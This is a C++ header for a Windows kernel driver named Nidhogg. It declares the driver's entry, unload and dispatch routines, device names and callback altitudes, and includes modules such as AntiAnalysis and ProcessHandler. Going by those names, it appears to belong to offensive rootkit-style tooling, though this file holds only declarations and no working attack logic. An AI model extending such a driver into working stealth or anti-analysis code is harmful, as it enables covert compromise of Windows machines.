#pragma once
#include "pch.h"

extern "C" {
	#include "WindowsTypes.h"
}
#include "NidhoggCommon.h"
#include "ProcessHandler.h"
#include "MemoryUtils.h"
#include "FileUtils.h"
#include "RegistryUtils.h"
#include "AntiAnalysis.h"
#include "NetworkUtils.h"
#include "ScriptManager.h"
#include "NidhoggDeviceControl.h"
#include "InitialOperation.h"

// Definitions.
constexpr SIZE_T REGISTERED_OB_CALLBACKS = 2;
#define DRIVER_NAME L"\\Driver\\Nidhogg"
#define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
#define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
#define OB_CALLBACKS_ALTITUDE L"31105.6171"
#define REG_CALLBACK_ALTITUDE L"31122.6172"

// Prototypes.
NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
DRIVER_UNLOAD NidhoggUnload;
DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
void ClearAll();
bool InitializeFeatures();
void ExecuteInitialOperations();
